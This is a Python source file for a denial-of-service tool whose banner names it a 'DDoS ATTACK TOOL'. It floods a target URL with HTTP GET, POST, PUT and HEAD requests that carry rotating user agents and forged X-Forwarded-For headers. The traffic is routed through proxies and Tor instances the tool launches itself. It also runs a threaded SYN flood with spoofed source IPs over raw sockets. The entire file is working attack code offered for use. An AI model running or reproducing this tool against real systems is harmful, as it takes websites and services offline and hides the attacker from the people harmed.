import requests
import os
from urllib.parse import urlparse
import time
import subprocess
import string
import signal
import sys
from referer import referers, flags_List
import logging
import random
import ssl
from socks import SOCKS5, set_default_proxy
import socket
import time
from collections import defaultdict
from contextlib import suppress
from threading import Thread, Lock
from scapy.all import IP, TCP  # Requires: pip install scapy
import threading
from concurrent.futures import ThreadPoolExecutor
from user_agents_list import user_agents

# Global variables for tracking request stats


request_count = 0
successful_requests = 0
failed_requests = 0

# List of user-agents for rotation
USER_AGENTS = user_agents

class ProxyChecker:
    @staticmethod
    def checkAll(proxies: list, url: str = "https://httpbin.org/get", timeout: int = 5, threads: int = 1000):
        with ThreadPoolExecutor(max_workers=min(len(proxies), threads)) as executor:
            future_to_proxy = {
                executor.submit(ProxyChecker._check_single, proxy, url, timeout): proxy
                for proxy in proxies
            }
            return [proxy for future, proxy in future_to_proxy.items() if future.result()]

    @staticmethod
    def _check_single(proxy: str, url: str, timeout: int):
        try:
            response = requests.get(url, proxies={"http": proxy, "https": proxy}, timeout=timeout)
            return response.status_code == 200
        except requests.RequestException:
            return False

# Function to validate proxies using ProxyChecker
def filter_working_proxies(proxies):
    print(f"proxy count: {len(proxies)}")
    print("[INFO] Validating proxies...")
    valid_proxies = ProxyChecker.checkAll(proxies)
    print(f"[INFO] {len(valid_proxies)} proxies are valid.")
    return valid_proxies



# Function to generate dynamic payloads
def generate_dynamic_payload():
    # Randomly choose the HTTP method
    methods = ['GET', 'POST', 'HEAD', 'PUT']
    method = random.choice(methods)

    # Create a random payload (simulated data for POST requests)
    if method == 'POST':
        payload = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        return {'method': method, 'payload': payload}
    
    # For GET/HEAD/PUT, use the method only (no payload)
    return {'method': method, 'payload': None}

def generate_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(referers),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Connection": "keep-alive",
    }

# Function to send HTTPS requests with dynamic payloads
def ddos_attack_https(target_url, requests_per_second, proxies):
    global request_count, successful_requests, failed_requests
    proxy_index = 0  # Start with the first proxy in the list
    while True:
        try:
            for _ in range(requests_per_second):
                # Select a random user-agent
                headers = generate_headers()

                # Rotate to the next proxy in the list
                proxy = proxies[proxy_index] if proxies else None
                proxy_config = {"http": proxy, "https": proxy} if proxy else None

                # Generate a dynamic payload
                payload_data = generate_dynamic_payload()
                method = payload_data['method']
                payload = payload_data['payload']

                if method == 'GET':
                    response = requests.get(target_url, headers=headers, proxies=proxy_config, timeout=5)
                elif method == 'POST':
                    response = requests.post(target_url, headers=headers, data={'data': payload}, proxies=proxy_config, timeout=5)
                elif method == 'PUT':
                    response = requests.put(target_url, headers=headers, data={'data': payload}, proxies=proxy_config, timeout=5)
                else:
                    response = requests.head(target_url, headers=headers, proxies=proxy_config, timeout=5)

                request_count += 1
                if response.status_code == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1

                # Move to the next proxy (rotate)
                proxy_index = (proxy_index + 1) % len(proxies)  # Loop back to 0 if we reach the end of the list
                
        except requests.exceptions.RequestException:
            failed_requests += 1


# Function to display real-time request statistics
def display_statistics2():
    global request_count, successful_requests, failed_requests
    previous_count = 0
    while True:
        current_count = request_count
        requests_last_second = current_count - previous_count
        previous_count = current_count
        color = "\033[1;31m"

        print(f"""{color}RPS:{requests_last_second} Total Requests Sent: {request_count} Successful Requests: {successful_requests} Failed Requests: {failed_requests}""" )
        time.sleep(1)

# Function to set up multiple Tor instances
def multitor(num_ports=5):
    # Generate unique random ports
    tor_ports = random.sample(range(1024, 65535), num_ports)
    tor_processes = []
    proxies = []

    for port in tor_ports:
        # Create a unique data directory for each instance
        data_dir = f"tor_data_{port}"
        os.makedirs(data_dir, exist_ok=True)

        # Generate Tor configuration for the instance
        tor_config = f"""
        SOCKSPort {port}
        DataDirectory {data_dir}
        """
        config_path = f"tor_config_{port}.conf"
        with open(config_path, 'w') as config_file:
            config_file.write(tor_config.strip())

        # Start the Tor instance
        try:
            print(f"Starting Tor on port {port}...")
            process = subprocess.Popen(['tor', '-f', config_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            tor_processes.append(process)
            proxies.append(f"socks5h://127.0.0.1:{port}")
            time.sleep(6)  # Wait for Tor to initialize
        except FileNotFoundError:
            print(f"[ERROR] Tor binary not found. Ensure Tor is installed and in PATH.")
            cleanup_tor_processes(tor_processes)
            sys.exit(1)

    print(f"{len(tor_ports)} Tor instances started on ports: {tor_ports}")
    return proxies, tor_processes

# Function to load proxies from a file
def load_proxies_from_file(file_path):
    proxies = []
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            proxies = [line.strip() for line in file if line.strip()]
    return proxies

# Function to gracefully terminate Tor processes
def cleanup_tor_processes(tor_processes):
    for process in tor_processes:
        process.terminate()
    print("\n[INFO] All Tor processes terminated.")

# Signal handler for graceful shutdown
def signal_handler(sig, frame):
    print("\n[INFO] Shutting down...")
    cleanup_tor_processes(tor_processes)
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


# ---------------------- Logging Setup ----------------------
logging.basicConfig(
    filename='syn_flood.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def log_packet_sent(dst_ip, dst_port, src_ip):
    logging.info(f"SYN packet sent from {src_ip} to {dst_ip}:{dst_port}")


# ---------------------- Rate Limiter ----------------------
class RateLimiter:
    """
    Allows only a limited number of requests per second per key.
    In this example, the key will be the source IP.
    """
    def __init__(self, limit):
        self.limit = limit
        self.timestamps = defaultdict(list)
        self.lock = Lock()

    def allow_request(self, key):
        current_time = time.time()
        with self.lock:
            # Keep only timestamps within the last second
            self.timestamps[key] = [t for t in self.timestamps[key] if current_time - t < 1]
            if len(self.timestamps[key]) < self.limit:
                self.timestamps[key].append(current_time)
                return True
        return False



# ---------------------- SYN Flood Class ----------------------
class SYNFlood:
    def __init__(self, target_ip, target_port, rate_limit, proxies=None, use_tls=True):
        self.target = (target_ip, target_port)
        self.syn_packet_count = 0
        self.rate_limiter = RateLimiter(rate_limit)
        self.lock = Lock()
        self.proxies = proxies if proxies else []  # List of valid proxies
        self.proxy_index = 0  # To rotate proxies
        self.use_tls = use_tls  # Use TLS/SSL encryption if True

    def generate_random_ip(self) -> str:
        """Generate random source IP address."""
        return "{}.{}.{}.{}".format(random.randint(1, 255), random.randint(0, 255), random.randint(0, 255), random.randint(1, 255))

    def _generate_syn(self) -> tuple[bytes, str]:
        """Generate SYN packet with randomized attributes."""
        src_ip = self.generate_random_ip()  # Randomize source IP
        ip_layer = IP(src=src_ip, dst=self.target[0], ttl=random.randint(1, 255))  # Random TTL
        tcp_layer = TCP(
            sport=random.randint(32768, 65535),
            dport=self.target[1],
            flags=random.choice(flags_List),
            seq=random.randint(0, 4294967295),
            window=random.randint(1000, 65535),  # Randomize TCP window size
        )
        payload_size = random.randint(0, 1460)
        payload = b'\x00' * payload_size  # No payload, just SYN
        packet = ip_layer / tcp_layer / payload
        return bytes(packet), src_ip

    def _send_syn_packet(self, raw_packet: bytes, proxy=None):
        """Send SYN packet through a raw socket or proxy."""
        with suppress(Exception):
            if self.use_tls:
                # Wrap the socket with SSL/TLS encryption
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect(self.target)
                    ssl_sock = context.wrap_socket(sock, server_hostname=self.target[0])
                    ssl_sock.send(raw_packet)
            else:
                if proxy:
                    # Forward packet via SOCKS proxy
                    self._forward_packet_via_proxy(raw_packet, proxy)
                else:
                    # Send directly without proxy
                    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as sock:
                        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                        sock.sendto(raw_packet, self.target)

    def _forward_packet_via_proxy(self, raw_packet: bytes, proxy: str):
        """Forward the SYN packet through a SOCKS proxy."""
        set_default_proxy(SOCKS5, proxy, 1080)  # Set SOCKS5 proxy (default port 1080)
        socket.socket = socket.socket  # Make sure we're using the SOCKS wrapper
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect(self.target)
            sock.send(raw_packet)

    def _get_next_proxy(self) -> str:
        """Get the next available proxy for use in the attack."""
        if not self.proxies:
            return None
        proxy = self.proxies[self.proxy_index]
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        return proxy

    def run_flood(self, packets_per_iteration: int):
        """Run SYN flood attack with rate limiting and proxy rotation."""
        while True:
            for _ in range(packets_per_iteration):
                raw_packet, src_ip = self._generate_syn()

                # Get the next available proxy
                proxy = self._get_next_proxy()

                if self.rate_limiter.allow_request(src_ip):
                    # Forward packets through proxy if one is available
                    if proxy:
                        self._send_syn_packet(raw_packet, proxy=proxy)
                    else:
                        self._send_syn_packet(raw_packet, proxy=None)

                    with self.lock:
                        self.syn_packet_count += 1
                    log_packet_sent(self.target[0], self.target[1], src_ip)
                else:
                    time.sleep(0.001)

            time.sleep(0.005)  # Reduce packet generation frequency to avoid rate-limiting issues

    def get_packet_count(self) -> int:
        """Get the total number of SYN packets sent."""
        with self.lock:
            return self.syn_packet_count


# ---------------------- Statistics Display ----------------------
def display_statistics(syn_flooder: SYNFlood):
    prev_count = 0
    while True:
        time.sleep(1)
        current_count = syn_flooder.get_packet_count()
        rps = current_count - prev_count
        prev_count = current_count
        print(f"\033[1;92mTotal SYN Packets Sent: {current_count} (RPS: {rps})\033[0m")



def resolve_url_to_ips(url):
    """
    Resolves a URL to its IP addresses.
    Returns a list of IPs associated with the given domain.
    """
    # Strip the protocol from the URL
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname

    try:
        ip_list = list(set(
            info[4][0] for info in socket.getaddrinfo(hostname, None, socket.AF_INET)
        ))
        return ip_list
    except socket.gaierror:
        print(f"Error: Unable to resolve {url}")
        return []
    

def main(target_url, target_port=80, thread_count=10, packets_per_thread=100, rate=10):
    """
    Main function that launches the SYN flood attack with parameters passed directly.
    """
    # Resolve URL to IP addresses
    target_ips = resolve_url_to_ips(target_url)

    if not target_ips:
        print("No valid IPs found for the given URL. Exiting.")
        return

    print(f"Resolved {target_url} to {target_ips}")

    for target_ip in target_ips:
        print(f"Launching SYN flood on {target_ip}:{target_port}...")

        syn_flooder = SYNFlood(target_ip, target_port, rate_limit=rate)

        # Start statistics thread
        stats_thread = Thread(target=display_statistics, args=(syn_flooder,), daemon=True)
        stats_thread.start()

        # Launch flood threads
        threads = []
        for _ in range(thread_count):
            thread = Thread(target=syn_flooder.run_flood, args=(packets_per_thread,), daemon=True)
            thread.start()
            threads.append(thread)

    print("Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping SYN flood attack...")

def main2():
    os.system('cls' if os.name == 'nt' else 'clear')
    color = "\033[1;31m"  # Corrected escape sequence for red color
    reset_color = "\033[0m"
    banner = r"""
╗██████╗ ██████╗  ██████╗ ███████╗
║██╔══██╗██╔══██╗██╔═══██╗██╔════╝
║██║  ██║██║  ██║██║   ██║███████╗
║██║  ██║██║  ██║██║   ██║╚════██║
║██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
    DDoS ATTACK TOOL
       -v 3.0
    """
    print(f"{color}{banner}{reset_color}") 
    # Input target details
    target_url = input("Enter Target URL (with https://): ")
    thread_count = int(input("Enter Number of Threads: ") or 100)
    thread_count_SYN = int(input("Enter Number of Threads for SYNFLOOD: ") or 100)

    requests_per_second = int(input("Enter Requests per Second per Thread: ") or 100)
    tor_instances = int(input("Enter Number of Tor Instances (0 for none): ") or 4)
    proxy_file = input("Enter Proxy File Path (leave blank to skip): ").strip()
    # Ask if the user wants to check proxies
    check_proxies = "y"
    target_port = int(input("Enter target port for SYN flood (default: 80): ") or 80)
    rate = int(input("Enter rate limit per source IP (packets per second): ") or 10)
    packets_per_thread = int(input("Enter number of SYN packets per thread iteration: ") or 100)
    

    # Load proxies from file if specified
    proxies = []
    if proxy_file:
        proxies = load_proxies_from_file(proxy_file)

    # Initialize Tor proxies if Tor is enabled
    global tor_processes
    tor_processes = []
    if tor_instances > 0:
        tor_proxies, tor_processes = multitor(tor_instances)
        proxies.extend(tor_proxies)

    # Only validate proxies if the user wants to check them
    if check_proxies == 'y':
        proxies = filter_working_proxies(proxies)
    else:
        proxies = filter_working_proxies(proxies)

        if not proxies:
            print("[ERROR] No working proxies available. Exiting.")
            cleanup_tor_processes(tor_processes)
            sys.exit(1)

    print(f"\n[INFO] Target: {target_url}")
    print("[INFO] Starting attack...\n")

    # Start statistics thread
    stats_thread = threading.Thread(target=display_statistics2, daemon=True)
    stats_thread.start()

    # Start attack threads
    for _ in range(thread_count):
        thread = threading.Thread(target=ddos_attack_https, args=(target_url, requests_per_second, proxies))
        thread.start()

    target_ips = resolve_url_to_ips(target_url)

    if not target_ips:
        print("No valid IPs found for the given URL. Exiting.")
        return

    print(f"Resolved {target_url} to {target_ips}")

    for target_ip in target_ips:
        print(f"Launching SYN flood on {target_ip}:{target_port}...")

        syn_flooder = SYNFlood(target_ip, target_port, rate_limit=rate)

        # Start statistics thread
        stats_thread = Thread(target=display_statistics, args=(syn_flooder,), daemon=True)
        stats_thread.start()

        # Launch flood threads
        threads = []
        for _ in range(thread_count_SYN):
            thread = Thread(target=syn_flooder.run_flood, args=(packets_per_thread,), daemon=True)
            thread.start()
            threads.append(thread)

    print("Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[INFO] Stopping SYN flood attack...")

if __name__ == "__main__":
    main2()

